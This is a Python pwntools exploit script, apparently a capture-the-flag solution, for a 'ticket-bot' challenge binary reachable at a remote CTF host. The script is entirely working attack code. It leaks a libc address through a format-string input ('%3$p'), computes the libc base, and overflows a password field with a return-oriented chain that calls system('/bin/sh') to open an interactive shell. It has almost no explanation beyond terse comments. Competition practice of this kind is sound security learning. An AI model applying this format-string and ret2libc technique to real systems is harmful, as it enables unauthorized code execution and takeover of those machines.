from pwn import *
from icecream import ic

elf = exe = ELF("./chal_patched")
libc = ELF("./libc.so.6")
ld = ELF("./ld-linux-x86-64.so.2")

context.binary = exe
context.log_level = "debug"
context.aslr = True

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    sys.argv += ' '
    if sys.argv[1] == 'r':
        args.REMOTE = True
    elif sys.argv[1] == 'd':
        args.GDB = True
    
    if args.REMOTE:
        return remote("ticket-bot.challs.csc.tf", 1337)
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
pie b 0x0000000000001421
pie b 0x0000000000001505
c
'''.format(**locals())

def sl(a): return io.sendline(a)
def s(a): return io.send(a)
def sa(a, b): return io.sendafter(a, b)
def sla(a, b): return io.sendlineafter(a, b)
def re(a): return io.recv(a)
def ru(a): return io.recvuntil(a)
def rl(): return io.recvline()
def i(): return io.interactive()

io = start()

whee = []
def reset():
    sl(b'1')
    ru("your new ticketID is ")
    whee.append(rl().strip())

def login():
    sl(b'2')
    ru("Admin Password\n")
    sl(heh)

def leak(val):
    sl(b'1')
    sla(b"Enter new Password", val)
    ru("Password changed to\n")
    leek = int(io.recvuntil('=', drop = True), 16)
    return leek

def finale(val):
    sl(b'1')
    sla(b"Enter new Password", val)

ru("ticketID ")
whee.append(rl().strip())
reset()
reset()
ic(whee)
heh = input("Enter final pass: ")
login()
# libc.address = leak(b"%3$p") - 0x10e077 diff offset remote, idk why, copied from v2, works
libc.address = leak(b"%3$p") - 0x10e297
heh = '0'
login()
# canary = leak(b"%7$p")
ic(hex(libc.address))
# ic(hex(canary))

pop_rdi = libc.address + 0x0000000000023b6a
ret = libc.address + 0x00000000000be2f9

payload = b'a'*16
payload += p64(ret)
payload += p64(pop_rdi)
payload += p64(next(libc.search(b'/bin/sh\x00')))
payload += p64(libc.sym['system'])
finale(payload)

io.interactive()
